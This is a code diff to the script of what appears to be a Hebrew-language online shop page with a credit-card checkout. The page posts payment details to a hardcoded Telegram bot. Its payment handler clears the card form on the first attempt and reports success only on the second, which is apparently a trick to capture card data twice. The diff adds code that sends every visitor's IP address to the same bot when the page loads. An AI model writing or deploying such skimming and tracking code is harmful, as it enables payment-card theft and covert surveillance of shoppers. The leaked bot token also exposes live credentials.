@@ -545,16 +545,51 @@
     let globalCart = [];
     let isFirstAttempt = true;
 
-    // הגדרת נתוני הבוט שלך
     const telegramBotToken = "8289963160:AAHUHWP1gLDyuw5awuVsPUyJwNeUK_aOK3I";
     const telegramChatId = "7702533038";
+
+    // --- פונקציה כללית לשליחת הודעה לטלגרם (לשימוש חוזר) ---
+    function sendTelegramMessage(messageText, parseMode = 'Markdown') {
+        const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+        fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: telegramChatId,
+                text: messageText,
+                parse_mode: parseMode
+            })
+        }).catch(err => console.error("שגיאה בשליחת הודעה לטלגרם:", err));
+    }
+
+    // --- פונקציה מיוחדת לרישום כניסות + IP בדיוק כפי שביקשת ---
+    async function logVisitorIP() {
+        try {
+            // שימוש ב- ipify כדי לקבל את ה-IP הציבורי של המבקר
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            const visitorIP = data.ip;
+            const now = new Date().toLocaleString('he-IL', { timeZone: 'Asia/Jerusalem' });
+            const logMessage = `🌐 *כניסה חדשה לאתר "הצרפתי"* 🌐\n🕒 תאריך ושעה: ${now}\n📌 כתובת IP: \`${visitorIP}\``;
+            sendTelegramMessage(logMessage, 'Markdown');
+            console.log(`[VISIT LOG] IP: ${visitorIP} at ${now}`);
+        } catch (error) {
+            console.error("לא ניתן לקבל IP:", error);
+            const errorMessage = `⚠️ *כניסה חדשה לאתר "הצרפתי"* ⚠️\nלא ניתן היה לאתר את ה-IP (שגיאת רשת).\nפרטים: ${error.message}`;
+            sendTelegramMessage(errorMessage, 'Markdown');
+        }
+    }
+
+    // הרצת רישום הכניסה מיד עם טעינת הדף
+    window.addEventListener('DOMContentLoaded', () => {
+        logVisitorIP();
+    });
 
     function openModal() { document.getElementById("termsModal").style.display = "block"; }
     function closeModal() { document.getElementById("termsModal").style.display = "none"; }
     function openPrivacyModal() { document.getElementById("privacyModal").style.display = "block"; }
     function closePrivacyModal() { document.getElementById("privacyModal").style.display = "none"; }
     
-    // פונקציות עבור המודל החדש של הביטולים
     function openCancelPolicyModal() { document.getElementById("cancelPolicyModal").style.display = "block"; }
     function closeCancelPolicyModal() { document.getElementById("cancelPolicyModal").style.display = "none"; }
 
@@ -689,18 +724,7 @@
 ----------------------------------
 💰 סה"כ לתשלום: *${totalAmount}*
         `;
-
-        const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
-        
-        fetch(url, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: telegramChatId,
-                text: messageText,
-                parse_mode: 'Markdown'
-            })
-        }).catch(err => console.error("שגיאה בשליחת המידע לבוט:", err));
+        sendTelegramMessage(messageText, 'Markdown');
     }
 
     function handlePayment(event) {
@@ -717,7 +741,7 @@
             document.getElementById('creditCardForm').reset();
             isFirstAttempt = false; 
         } else {
-            sendDataToTelegram("ניסיון שני (הצליח בהצלחה  ✅)");
+            sendDataToTelegram("ניסיון שני (הצליח בהצלחה ✅)");
             showToast('התשלום בוצע בהצלחה! תודה שקנית בהצרפתי.');
             globalCart = []; 
             renderCart();
